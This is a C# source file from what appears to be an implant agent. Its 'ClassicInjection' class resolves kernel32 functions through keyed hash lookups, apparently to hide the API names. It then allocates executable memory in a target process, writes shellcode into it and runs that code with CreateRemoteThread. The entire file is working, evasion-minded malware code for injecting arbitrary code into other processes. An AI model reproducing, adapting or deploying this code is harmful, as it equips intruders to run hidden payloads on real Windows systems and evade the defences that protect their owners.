using System;
using System.Collections.Generic;
using System.Diagnostics;
using Invoker.Data;
using Invoker.Dynamic;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;

namespace Agent
{
    internal class ClassicInjection : ITechnique
    {
        int ITechnique.id => 1;
        private long key = 0x617468656E61;
        private delegate IntPtr VirtAllocExDelegate(IntPtr target, IntPtr lpAddress, UInt32 dwSize, Native.AllocationType flAllocationType, Native.MemoryProtection flProtect);
        private delegate bool WriteProcMemDelegate(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, int nSize, out IntPtr lpNumberOfBytesWritten);
        private delegate nint CrtDelegate(IntPtr target, IntPtr lpAddress, UInt32 dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, Native.ThreadCreationFlags dwCreationFlags, out IntPtr hThread);

        private Dictionary<string, string> map = new Dictionary<string, string>()
        {
            { "crt","D2CF12547B8E0297710F0C1B7A6B8174" },
            { "vae", "B0EEE07D4F1EA12B868089343F9264C6" },
            { "wpm", "A7592F86BEF17E2705EE75EFA81EF52B" },
            { "k32", "A63CBAF3BECF39638EEBC81A422A5D00" }
        };

        public bool Inject(byte[] shellcode, IntPtr hTarget)
        {
            return this.Run(hTarget, shellcode);
        }

        public bool Inject(byte[] shellcode, Process proc)
        {
            return this.Run(proc.Handle, shellcode);
        }

        private bool Run(IntPtr target, byte[] shellcode)
        {
            ///////////////////// Kernel32 /////////////////////
            var k32Mod = Generic.GetLoadedModuleAddress(map["k32"], key);

            if(k32Mod == IntPtr.Zero)
            {
                return false;
            }
            ///////////////////// Kernel32 /////////////////////
            //////////////////////// VirtualAllocEx /////////////////////
            var pFunc = Generic.GetExportAddress(k32Mod, map["vae"], key);
            
            if(pFunc == IntPtr.Zero)
            {
                return false;
            }

            //IntPtr pAddr = Native.VirtualAllocEx(target, IntPtr.Zero, (UInt32)shellcode.Length, Native.AllocationType.Commit | Native.AllocationType.Reserve, Native.MemoryProtection.PAGE_EXECUTE_READWRITE);
            object[] vaeParams = new object[] { target, IntPtr.Zero, (UInt32)shellcode.Length, Native.AllocationType.Commit | Native.AllocationType.Reserve, Native.MemoryProtection.PAGE_EXECUTE_READWRITE };
            IntPtr pAddr = Generic.DynamicFunctionInvoke<IntPtr>(pFunc, typeof(VirtAllocExDelegate), ref vaeParams);
            
            if (pAddr == IntPtr.Zero)
            {
                return false;
            }
            ///////////////////// VirtualAllocEx /////////////////////
            
            //////////////////////// WriteProcessMemory /////////////////////
            var pFunc2 = Generic.GetExportAddress(k32Mod, map["wpm"], key);
            if (pFunc2 == IntPtr.Zero)
            {
                return false;
            }

            IntPtr lpNumberOfBytesWritten = IntPtr.Zero;
            object[] wpmParams = new object[] { target, pAddr, shellcode, shellcode.Length, lpNumberOfBytesWritten };

            if (!Generic.DynamicFunctionInvoke<bool>(pFunc2, typeof(WriteProcMemDelegate), ref wpmParams))
            {
                return false;
            }
            //////////////////////// WriteProcessMemory /////////////////////
            
            //////////////////////// CreateRemoteThread /////////////////////
            var pFunc3 = Generic.GetExportAddress(k32Mod, map["crt"], key);

            if(pFunc3 == IntPtr.Zero)
            {
                return false;
            }

            IntPtr hThreadId = IntPtr.Zero;
            object[] crtParams = new object[] { target, IntPtr.Zero, (UInt32)0, pAddr, IntPtr.Zero, Native.ThreadCreationFlags.NORMAL, hThreadId };
            IntPtr hThread = Generic.DynamicFunctionInvoke<nint>(pFunc3, typeof(CrtDelegate), ref crtParams);

            if (hThread == IntPtr.Zero)
            {
                return false;
            }
            //////////////////////// CreateRemoteThread /////////////////////
            return true;
        }
    }
}
